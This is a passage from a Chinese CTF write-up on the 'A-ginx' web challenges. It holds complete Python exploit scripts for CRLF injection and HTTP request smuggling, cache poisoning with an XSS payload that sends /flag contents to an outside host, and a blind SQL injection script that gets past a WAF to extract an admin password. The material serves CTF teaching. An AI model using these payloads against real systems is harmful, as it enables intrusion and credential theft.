title="缓存服务"></a>缓存服务</h3><p>观察各个API，你会发现在<code>/static/</code> 下的请求，会进行缓存，并出现<code>cache-key</code>。这个请求头没有<code>Trace-Id</code>，也表示它是直接的被缓存在了A-ginx端中。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791763.png"></p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><ol><li>400 Bad Request</li></ol><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791751.png"></p><p>携带<code>Trace-Id</code> 说明该请求为后端返回的。</p><ol start="2"><li>500 Internal Server Error</li></ol><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791762.png"></p><p>未携带<code>Trace-Id</code> ，说明这个500是A-ginx出错造成的。根本原因是因为错误的请求包，导致后端断开了和前端的TCP请求，第二次访问的时候连接已经断开，导致500。</p><h3 id="确认基本攻击思路"><a href="#确认基本攻击思路" class="headerlink" title="确认基本攻击思路"></a>确认基本攻击思路</h3><p>这样我们就大致确定了攻击思路，通过CRLF注入把带有XSS payload的JSON写入A-ginx的&#x2F;static&#x2F;下的cache中。之后通过目录穿越，让<code>/v/articles/uuid</code> 转变为获取  <code>/static/kur4ge1337.json</code>来触发XSS。</p><h3 id="写入恶意json"><a href="#写入恶意json" class="headerlink" title="写入恶意json"></a>写入恶意json</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:20443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">payload1 = parse.quote(<span class="string">f&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /v/articles/preview HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 418</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">title=%7b%22data%22%3a%7b%22_id%22%3a%22%22%2c%22title%22%3a%22Kur4ge1337%22%2c%22author%22%3a%22Kur4ge1337%22%2c%22htmlContent%22%3a%22%3cimg+src%3d%2f%2fflag+onerror%3d%27fetch%28%60%2fflag%60%29.then%28r%3d%3er.text%28%29%29.then%28%28c%29%3d%3e%7bfetch%28%60%2f%2fa.bcd.ef%3a12345%2f%60%2bc%29%7d%29%27%3e%22%2c%22submissionTime%22%3a1633621705%2c%22tags%22%3a%22%22%7d%2c%22status%22%3a0%2c+%22&amp;content=%22%3a0%7d&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span> + payload1)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br></pre></td></tr></table></figure><p>通过上面的Payload，我们可以写入任意数据到&#x2F;static&#x2F;下，但是新的问题出现了。</p><h3 id="Flag的获取"><a href="#Flag的获取" class="headerlink" title="Flag的获取"></a>Flag的获取</h3><p><code>/flag</code>要求管理员凭据，但是我们的管理员凭据只会在请求 <code>/v/articles/uuid</code> 时发送，那么，即使我们获得了XSS，也没有办法获得管理员凭据（非预期的方案不算…）</p><p>这里就要提一个点，fetch 会自动跟随302跳转。而带有<code>../</code>的路径又会触发302跳转。那么有没办法通过CRLF注入，把管理员凭证的利用点向后移动呢？</p><p>当然可以，构造Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..%25252f..%25252fstatic%252fKur4ge1337.json%2520HTTP%252f1<span class="number">.1</span>%250aHost:%2520localhost%250aConnection:%2520Keep-Alive%250a%250aGET%<span class="number">2520</span>%252fflag</span><br></pre></td></tr></table></figure><p>Admin Location跳转后，会提取<code>/#/articles/</code> 后的内容，向<code>Aginx</code>发送请求 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /v/articles/..%<span class="number">25252</span>f..%<span class="number">25252</span>fstatic%<span class="number">252</span>fKur4ge1337.json%<span class="number">2520</span>HTTP%<span class="number">252</span>f1.<span class="number">1</span>%<span class="number">250</span>aHost:%<span class="number">2520</span>localhost%<span class="number">250</span>aConnection:%<span class="number">2520</span>Keep-Alive%<span class="number">250</span>a%<span class="number">250</span>aGET%<span class="number">2520</span>%<span class="number">252</span>fflag HTTP/<span class="number">2</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Authoration</span>：Bearer ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Aginx 接收到请求，转发给<code>web</code> 请求如下，</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/v/</span>articles<span class="regexp">/..%2f..%2fstatic/</span>Kur4ge1337.json HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="attr">Host:</span> localhost</span><br><span class="line"><span class="attr">Connection:</span> Keep-Alive</span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/flag HTTP/</span><span class="number">1.1</span></span><br><span class="line">Authoration：Bearer ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>web</code> 发现存在<code>..%2f</code> 返回301跳转，这里也走私了一个<code>/flag</code> (5行之后)请求，并且携带了Admin的凭证</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">301</span></span><br><span class="line"><span class="attribute">Location</span>: /static/Kur4ge1337.json</span><br></pre></td></tr></table></figure><p><code>fetch</code>发现存在301跳转，会自动跟随<code>Location</code> 发起第二轮请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /static/Kur4ge1337.json HTTP/2.0</span><br><span class="line">Authoration：Bearer ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这个请求已经被<code>Cache</code>，就在<code>Aginx</code>端直接进行了拦截返回，即这个请求是不会发送到<code>Web</code> 即不会获取到走私的<code>/flag</code></p><p>可以在页面中成功触发XSS，通过<code>onerror</code>来发起<code>/flag</code> 请求，来读取到之前走私的<code>/flag</code>。</p><p>问题解决~</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:20443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">payload1 = parse.quote(<span class="string">f&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /v/articles/preview HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 418</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">title=%7b%22data%22%3a%7b%22_id%22%3a%22%22%2c%22title%22%3a%22Kur4ge1337%22%2c%22author%22%3a%22Kur4ge1337%22%2c%22htmlContent%22%3a%22%3cimg+src%3d%2f%2fflag+onerror%3d%27fetch%28%60%2fflag%60%29.then%28r%3d%3er.text%28%29%29.then%28%28c%29%3d%3e%7bfetch%28%60%2f%2fa.bcd.ef%3a12345%2f%60%2bc%29%7d%29%27%3e%22%2c%22submissionTime%22%3a1633621705%2c%22tags%22%3a%22%22%7d%2c%22status%22%3a0%2c+%22&amp;content=%22%3a0%7d&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">    <span class="comment"># data = &#123;&#x27;title&#x27;: &#x27;test&#x27;, &#x27;content&#x27;: &#x27;&lt;p&gt;&lt;/p&gt;&#x27;&#125;</span></span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span> + payload1)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encodeURI</span>(<span class="params">s</span>):</span><br><span class="line">    r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;&#x27;&#x27;\r\n&quot;&#x27;%&amp;/ &#x27;&#x27;&#x27;</span>:</span><br><span class="line">            r +=  <span class="string">&#x27;%&#123;:0&gt;2x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r += c</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = encodeURI(encodeURI(<span class="string">f&#x27;&#x27;&#x27;..%2f..%2fstatic/Kur4ge1337.json HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag&#x27;&#x27;&#x27;</span>.strip()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">suffix = io.recvuntil(<span class="string">b&#x27;)&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = io.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(suffix) == <span class="number">16</span> <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">hash</span>) == <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">suffix, <span class="built_in">hash</span></span>):</span><br><span class="line">    chars = string.digits + string.ascii_letters</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> chars:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">for</span> d <span class="keyword">in</span> chars:</span><br><span class="line">                        xxxx = <span class="string">f&#x27;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span>&#x27;</span></span><br><span class="line">                        <span class="keyword">if</span> sha256(xxxx.encode() + suffix).hexdigest() == <span class="built_in">hash</span>:</span><br><span class="line">                            <span class="keyword">return</span> xxxx</span><br><span class="line"></span><br><span class="line">io.sendline(solve_pow(suffix, <span class="built_in">hash</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="A-ginx2"><a href="#A-ginx2" class="headerlink" title="A-ginx2"></a>A-ginx2</h2><h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>要获取管理员的密码，唯一可能就是注入了，其实没什么数据库交互点，可以看到有个query参数很奇怪，里面给的是json的k-v的形式，如果有写过gorm，那么你一定知道，GORM中where可以传入<code>*map[string]interface&#123;&#125;</code> ，其中key可控的情况就会造成SQLi</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713093.png"></p><p>通过简单的尝试，可以获取到SQLi。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713094.png"></p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713095.png"></p><p>以上两个payload可以简单的确认，这里存在注入。</p><p>但是，存在对参数的WAF，需要如何绕过呢？是的。请求走私。</p><h3 id="绕WAF-amp-获取密码"><a href="#绕WAF-amp-获取密码" class="headerlink" title="绕WAF &amp; 获取密码"></a>绕WAF &amp; 获取密码</h3><p>代码中只对参数进行检测，所以，只要走私到body，就可以绕过这个WAF啦！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:30443&#x27;</span></span><br><span class="line">Authorization = <span class="string">&#x27;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDAwMDEyMjMsInVzZXJuYW1lIjoia3VyNGdlIn0.Ml09NIlcP5dmiYM0rF09jbvYS3EiT7_EPUgz1Ue4tu0&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    query = parse.quote(json.dumps(&#123;<span class="string">f&quot;title` OR (SELECT 1 FROM users WHERE username=&#x27;admin&#x27; AND <span class="subst">&#123;payload&#125;</span>) OR `title&quot;</span>:<span class="string">&quot;n0t_Exsit&quot;</span>&#125;))</span><br><span class="line">        </span><br><span class="line">    data = <span class="string">f&#x27;&#x27;&#x27;GET /v/articles?pageNum=0&amp;pageSize=36&amp;query=<span class="subst">&#123;query&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string">Authorization: <span class="subst">&#123;Authorization&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, headers=headers, data=data)</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        obj = json.loads(r.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(obj[<span class="string">&#x27;articles&#x27;</span>]) != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">base_sql = <span class="string">&#x27;ASCII(SUBSTR(password,&#123;&#125;,1))&gt;&#123;&#125;&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">29</span>):</span><br><span class="line">    Min = <span class="number">0x10</span></span><br><span class="line">    Max = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(Max - Min) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min) // <span class="number">2</span></span><br><span class="line">        payload = base_sql.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    password += <span class="built_in">chr</span>(Max)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><p>写出布尔注的脚本，简简单单可以跑到密码<code>Visit_/flag_to_get_the_flag!</code></p><p>但是，<code>/flag</code> 是需要内网ip才能访问。本题没有ssrf，没有xss bot。考虑常见的XFF Payload发现无效，只能来获取真正的XFF头。</p><h3 id="获取IP-Header"><a href="#获取IP-Header" class="headerlink" title="获取IP Header"></a>获取IP Header</h3><p>来获取返回头，需要一个能够返回请求中Query的API。<code>/v/articles/preview</code> 这个API 就可以完成这个能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:30443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_header</span>():</span><br><span class="line">    data = <span class="string">&#x27;title=1&amp;content=&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span> : <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span> : <span class="built_in">str</span>(<span class="built_in">len</span>(data) + <span class="number">300</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    first = <span class="string">&#x27;&#x27;&#x27;GET /v/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, headers=&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;, data=first)</span><br><span class="line">        r = client.request(<span class="string">&quot;POST&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/articles/preview&#x27;</span>, headers=headers, data=data)</span><br><span class="line">        r = client.request(<span class="string">&quot;POST&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, data=<span class="string">&#x27;a&#x27;</span>*<span class="number">400</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">get_header()</span><br></pre></td></tr></table></figure><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713096.png"></p><p>拿到Client获取信任IP的header 为 <code>X-Sup3r-DiAnA-Re4l-Ip</code></p><h3 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:30443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        r = client.post(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/login&#x27;</span>, json=data)</span><br><span class="line">        <span class="keyword">return</span> json.loads(r.text)[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">token, header</span>):</span><br><span class="line">    data = <span class="string">f&#x27;&#x27;&#x27;GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string"><span class="subst">&#123;header&#125;</span>: 172.16.0.1:23333</span></span><br><span class="line"><span class="string">Authorization: Bearer <span class="subst">&#123;token&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, headers=&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;, data=data)</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/flag&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">return</span> json.loads(r.text)[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">token = login(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;Visit_/flag_to_get_the_flag!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line">flag = get_flag(token, <span class="string">&#x27;X-Sup3r-DiAnA-Re4l-Ip&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713107.png"></p><h1 id="为了出题而出题-x2F-偷懒的地方"><a href="#为了出题而出题-x2F-偷懒的地方" class="headerlink" title="为了出题而出题&#x2F;偷懒的地方"></a>为了出题而出题&#x2F;偷懒的地方</h1><p>虽然说了那么多命题要义，但最终还是有些问题，不得不用trick来解决。</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713108.gif?x-oss-process=style/w200"></p></div><h2 id="“迫真”的缓存cache"><a href="#“迫真”的缓存cache" class="headerlink" 